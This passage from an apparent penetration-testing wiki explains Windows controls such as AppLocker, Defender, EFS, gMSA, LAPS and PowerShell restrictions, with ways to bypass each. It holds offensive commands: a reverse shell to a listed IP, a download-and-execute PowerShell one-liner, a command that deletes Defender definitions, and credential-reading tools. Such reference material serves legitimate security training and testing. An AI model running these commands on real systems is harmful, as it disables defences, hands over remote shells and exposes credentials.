  \ whitelist is a list of approved software applications or executables that are allowed to be present and run on a system.\
  \ The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific\
  \ business needs of an organization.\n\n[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)\
  \ is Microsoft's **application whitelisting solution** and gives system administrators control over **which applications\
  \ and files users can run**. It provides **granular control** over executables, scripts, Windows installer files, DLLs,\
  \ packaged apps, and packed app installers.\\\nIt is common for organizations to **block cmd.exe and PowerShell.exe** and\
  \ write access to certain directories, **but this can all be bypassed**.\n\n### Check\n\nCheck which files/extensions are\
  \ blacklisted/whitelisted:\n\n```bash\nGet-ApplockerPolicy -Effective -xml\n\nGet-AppLockerPolicy -Effective | select -ExpandProperty\
  \ RuleCollections\n\n$a = Get-ApplockerPolicy -effective\n$a.rulecollections\n```\n\nThis registry path contains the configurations\
  \ and policies applied by AppLocker, providing a way to review the current set of rules enforced on the system:\n\n- `HKLM\\\
  Software\\Policies\\Microsoft\\Windows\\SrpV2`\n\n### Bypass\n\n- Useful **Writable folders** to bypass AppLocker Policy:\
  \ If AppLocker is allowing to execute anything inside `C:\\Windows\\System32` or `C:\\Windows` there are **writable folders**\
  \ you can use to **bypass this**.\n\n```\nC:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys\nC:\\Windows\\System32\\\
  spool\\drivers\\color\nC:\\Windows\\Tasks\nC:\\windows\\tracing\n```\n\n- Commonly **trusted** [**\"LOLBAS's\"**](https://lolbas-project.github.io/)\
  \ binaries can be also useful to bypass AppLocker.\n- **Poorly written rules could also be bypassed**\n  - For example,\
  \ **`<FilePathCondition Path=\"%OSDRIVE%*\\allowed*\"/>`**, you can create a **folder called `allowed`** anywhere and it\
  \ will be allowed.\n  - Organizations also often focus on **blocking the `%System32%\\WindowsPowerShell\\v1.0\\powershell.exe`\
  \ executable**, but forget about the **other** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)\
  \ such as `%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe` or `PowerShell_ISE.exe`.\n- **DLL enforcement\
  \ very rarely enabled** due to the additional load it can put on a system, and the amount of testing required to ensure\
  \ nothing will break. So using **DLLs as backdoors will help bypassing AppLocker**.\n- You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)\
  \ or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code\
  \ in any process and bypass AppLocker. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).\n\
  \n## Credentials Storage\n\n### Security Accounts Manager (SAM)\n\nLocal credentials are present in this file, the passwords\
  \ are hashed.\n\n### Local Security Authority (LSA) - LSASS\n\nThe **credentials** (hashed) are **saved** in the **memory**\
  \ of this subsystem for Single Sign-On reasons.\\\n**LSA** administrates the local **security policy** (password policy,\
  \ users permissions...), **authentication**, **access tokens**...\\\nLSA will be the one that will **check** for provided\
  \ credentials inside the **SAM** file (for a local login) and **talk** with the **domain controller** to authenticate a\
  \ domain user.\n\nThe **credentials** are **saved** inside the **process LSASS**: Kerberos tickets, hashes NT and LM, easily\
  \ decrypted passwords.\n\n### LSA secrets\n\nLSA could save in disk some credentials:\n\n- Password of the computer account\
  \ of the Active Directory (unreachable domain controller).\n- Passwords of the accounts of Windows services\n- Passwords\
  \ for scheduled tasks\n- More (password of IIS applications...)\n\n### NTDS.dit\n\nIt is the database of the Active Directory.\
  \ It is only present in Domain Controllers.\n\n## Defender\n\n[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender)\
  \ is an Antivirus that is available in Windows 10 and Windows 11, and in versions of Windows Server. It **blocks** common\
  \ pentesting tools such as **`WinPEAS`**. However, there are ways to **bypass these protections**.\n\n### Check\n\nTo check\
  \ the **status** of **Defender** you can execute the PS cmdlet **`Get-MpComputerStatus`** (check the value of **`RealTimeProtectionEnabled`**\
  \ to know if it's active):\n\n<pre class=\"language-powershell\"><code class=\"lang-powershell\">PS C:\\> Get-MpComputerStatus\n\
  \n[...]\nAntispywareEnabled              : True\nAntispywareSignatureAge         : 1\nAntispywareSignatureLastUpdated :\
  \ 12/6/2021 10:14:23 AM\nAntispywareSignatureVersion     : 1.323.392.0\nAntivirusEnabled                : True\n[...]\n\
  NISEnabled                      : False\nNISEngineVersion                : 0.0.0.0\n[...]\n<strong>RealTimeProtectionEnabled\
  \       : True\n</strong>RealTimeScanDirection           : 0\nPSComputerName                  :\n</code></pre>\n\nTo enumerate\
  \ it you could also run:\n\n```bash\nWMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get\
  \ displayName /Format:List\nwmic /namespace:\\\\root\\securitycenter2 path antivirusproduct\nsc query windefend\n\n#Delete\
  \ all rules of Defender (useful for machines without internet access)\n\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\"\
  \ -RemoveDefinitions -All\n```\n\n## Encrypted File System (EFS)\n\nEFS secures files through encryption, utilizing a **symmetric\
  \ key** known as the **File Encryption Key (FEK)**. This key is encrypted with the user's **public key** and stored within\
  \ the encrypted file's $EFS **alternative data stream**. When decryption is needed, the corresponding **private key** of\
  \ the user's digital certificate is used to decrypt the FEK from the $EFS stream. More details can be found [here](https://en.wikipedia.org/wiki/Encrypting_File_System).\n\
  \n**Decryption scenarios without user initiation** include:\n\n- When files or folders are moved to a non-EFS file system,\
  \ like [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), they are automatically decrypted.\n- Encrypted files\
  \ sent over the network via SMB/CIFS protocol are decrypted prior to transmission.\n\nThis encryption method allows **transparent\
  \ access** to encrypted files for the owner. However, simply changing the owner's password and logging in will not permit\
  \ decryption.\n\n**Key Takeaways**:\n\n- EFS uses a symmetric FEK, encrypted with the user's public key.\n- Decryption employs\
  \ the user's private key to access the FEK.\n- Automatic decryption occurs under specific conditions, like copying to FAT32\
  \ or network transmission.\n- Encrypted files are accessible to the owner without additional steps.\n\n### Check EFS info\n\
  \nCheck if a **user** has **used** this **service** checking if this path exists:`C:\\users\\<username>\\appdata\\roaming\\\
  Microsoft\\Protect`\n\nCheck **who** has **access** to the file using cipher /c \\<file>\\\nYou can also use `cipher /e`\
  \ and `cipher /d` inside a folder to **encrypt** and **decrypt** all the files\n\n### Decrypting EFS files\n\n#### Being\
  \ Authority System\n\nThis way requires the **victim user** to be **running** a **process** inside the host. If that is\
  \ the case, using a `meterpreter` sessions you can impersonate the token of the process of the user (`impersonate_token`\
  \ from `incognito`). Or you could just `migrate` to process of the user.\n\n#### Knowing the users password\n\n\n{{#ref}}\n\

  \ (gMSA)\n\nMicrosoft developed **Group Managed Service Accounts (gMSA)** to simplify the management of service accounts\
  \ in IT infrastructures. Unlike traditional service accounts that often have the \"**Password never expire**\" setting enabled,\
  \ gMSAs offer a more secure and manageable solution:\n\n- **Automatic Password Management**: gMSAs use a complex, 240-character\
  \ password that automatically changes according to domain or computer policy. This process is handled by Microsoft's Key\
  \ Distribution Service (KDC), eliminating the need for manual password updates.\n- **Enhanced Security**: These accounts\
  \ are immune to lockouts and cannot be used for interactive logins, enhancing their security.\n- **Multiple Host Support**:\
  \ gMSAs can be shared across multiple hosts, making them ideal for services running on multiple servers.\n- **Scheduled\
  \ Task Capability**: Unlike managed service accounts, gMSAs support running scheduled tasks.\n- **Simplified SPN Management**:\
  \ The system automatically updates the Service Principal Name (SPN) when there are changes to the computer's sAMaccount\
  \ details or DNS name, simplifying SPN management.\n\nThe passwords for gMSAs are stored in the LDAP property _**msDS-ManagedPassword**_\
  \ and are automatically reset every 30 days by Domain Controllers (DCs). This password, an encrypted data blob known as\
  \ [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e),\
  \ can only be retrieved by authorized administrators and the servers on which the gMSAs are installed, ensuring a secure\
  \ environment. To access this information, a secured connection such as LDAPS is required, or the connection must be authenticated\
  \ with 'Sealing & Secure'.\n\n![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)\n\nYou can read this password\
  \ with [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**\n\n```\n/GMSAPasswordReader --AccountName\
  \ jkohler\n```\n\n[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)\n\nAlso, check this [web\
  \ page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password**\
  \ of **gMSA**.\n\n## LAPS\n\nThe **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899),\
  \ enables the management of local Administrator passwords. These passwords, which are **randomized**, unique, and **regularly\
  \ changed**, are stored centrally in Active Directory. Access to these passwords is restricted through ACLs to authorized\
  \ users. With sufficient permissions granted, the ability to read local admin passwords is provided.\n\n\n{{#ref}}\nactive-directory-methodology/laps.md\n\
  {{#endref}}\n\n## PS Constrained Language Mode\n\nPowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)\
  \ **locks down many of the features** needed to use PowerShell effectively, such as blocking COM objects, only allowing\
  \ approved .NET types, XAML-based workflows, PowerShell classes, and more.\n\n### **Check**\n\n```bash\n$ExecutionContext.SessionState.LanguageMode\n\
  #Values could be: FullLanguage or ConstrainedLanguage\n```\n\n### Bypass\n\n```bash\n#Easy bypass\nPowershell -version 2\n\
  ```\n\nIn current Windows that Bypass won't work but you can use[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\\\
  \n**To compile it you may need** **to** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> add `C:\\Windows\\Microsoft.NET\\\
  assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0\\31bf3856ad364e35\\System.Management.Automation.dll` and\
  \ **change the project to .Net4.5**.\n\n#### Direct bypass:\n\n```bash\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\\
  InstallUtil.exe /logfile= /LogToConsole=true /U c:\\temp\\psby.exe\n```\n\n#### Reverse shell:\n\n```bash\nC:\\Windows\\\
  Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206\
  \ /rport=443 /U c:\\temp\\psby.exe\n```\n\nYou can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)\
  \ or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code\
  \ in any process and bypass the constrained mode. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).\n\
  \n## PS Execution Policy\n\nBy default it is set to **restricted.** Main ways to bypass this policy:\n\n```bash\n1º Just\
  \ copy and paste inside the interactive PS console\n2º Read en Exec\nGet-Content .runme.ps1 | PowerShell.exe -noprofile\
  \ -\n3º Read and Exec\nGet-Content .runme.ps1 | Invoke-Expression\n4º Use other execution policy\nPowerShell.exe -ExecutionPolicy\
  \ Bypass -File .runme.ps1\n5º Change users execution policy\nSet-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted\n\
  6º Change execution policy for this session\nSet-ExecutionPolicy Bypass -Scope Process\n7º Download and execute:\npowershell\
  \ -nop -c \"iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')\"\n8º Use command switch\nPowershell -command\
  \ \"Write-Host 'My voice is my passport, verify me.'\"\n9º Use EncodeCommand\n$command = \"Write-Host 'My voice is my passport,\
  \ verify me.'\" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes)\
  \ powershell.exe -EncodedCommand $encodedCommand\n```\n\nMore can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)\n\
  \n## Security Support Provider Interface (SSPI)\n\nIs the API that can be use to authenticate users.\n\nThe SSPI will be\
  \ in charge of finding the adequate protocol for two machines that want to communicate. The preferred method for this is\
  \ Kerberos. Then the SSPI will negotiate which authentication protocol will be used, these authentication protocols are\
  \ called Security Support Provider (SSP), are located inside each Windows machine in the form of a DLL and both machines\
  \ must support the same to be able to communicate.\n\n### Main SSPs\n\n- **Kerberos**: The preferred one\n  - %windir%\\\
  Windows\\System32\\kerberos.dll\n- **NTLMv1** and **NTLMv2**: Compatibility reasons\n  - %windir%\\Windows\\System32\\msv1_0.dll\n\
  - **Digest**: Web servers and LDAP, password in form of a MD5 hash\n  - %windir%\\Windows\\System32\\Wdigest.dll\n- **Schannel**:\
  \ SSL and TLS\n  - %windir%\\Windows\\System32\\Schannel.dll\n- **Negotiate**: It is used to negotiate the protocol to use\
  \ (Kerberos or NTLM being Kerberos the default one)\n  - %windir%\\Windows\\System32\\lsasrv.dll\n\n#### The negotiation\
  \ could offer several methods or only one.\n\n## UAC - User Account Control\n\n[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)\
  \ is a feature that enables a **consent prompt for elevated activities**.\n\n\n{{#ref}}\nauthentication-credentials-uac-and-efs/uac-user-account-control.md\n\
